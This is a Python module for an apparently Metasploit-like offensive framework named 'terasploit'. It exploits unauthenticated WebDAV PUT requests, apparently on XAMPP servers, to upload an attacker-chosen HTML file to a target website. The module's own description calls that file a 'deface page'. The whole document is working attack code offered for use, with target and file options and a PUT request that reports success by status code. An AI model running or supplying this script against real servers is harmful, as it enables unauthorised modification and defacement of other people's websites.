#######
# Module/Exploit: XAMPP WebDav Upload PHP
#######

from libs.terasploit.framework.opts.opt_container import *
from libs.terasploit.framework.info.info_container import *
from libs.terasploit.framework.module.auxiliary import *

class TerasploitModule(Auxiliary):
    
    module_type = 'auxiliary'
    
    def initialize(self,info_only: bool = False) -> None:
        update_info (
            {
                'Module' : 'auxiliary',
                'Name' : 'WebDav Unauthenticated HTML file upload via put request',
                'Author' : 'Charlie (4steroth)',
                
                'Description' : [
                    'Takes advantage of unauthenticated put requests WebDav',
                    'vulnerability on the target, allowing user to upload a',
                    'deface page to the website. It only uploads an html file',
                    'It does not give any access to the target.'
                ]
            }
        )

        if info_only:
            return
        
        register_option ('auxiliary',opt=[
            OptURL.new('target',['','yes','url of the target']),
            OptFile.new('html_file',['','yes','path of the html file to upload']),
            OptString.new('html_name','none',['filename','yes','html file name to use'])
        ])

    def run(self) -> tuple[str, bool]: 
        target = self.GetOPT('target')
        html_file = self.GetOPT('html_file')
        html_name = self.GetOPT('html_name')

        with open(html_file, 'r') as f:
            html_content = f.read()

        scheme, hostname = self.ParseTarget(target,return_list=['scheme','hostname'])
        upload_url = f'{scheme}://{hostname}/{html_name}.html'
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'}

        try:
            exploit = HTTPClient.Request('put',url=upload_url,headers=headers,data=html_content)
            if exploit.status_code in self.good_status_code():
                info_print (f"Html file uploaded: {upload_url}",)
                info_print (f'Status code: {exploit.status_code}',type='green')
                return 'done', True
            else:
                info_print ('Failed to upload html file.',type='red')
                info_print (f'Status code: {exploit.status_code}')
                return 'done', True

        except Exception as error:
            info_print (error,type='red')
            return 'exception', True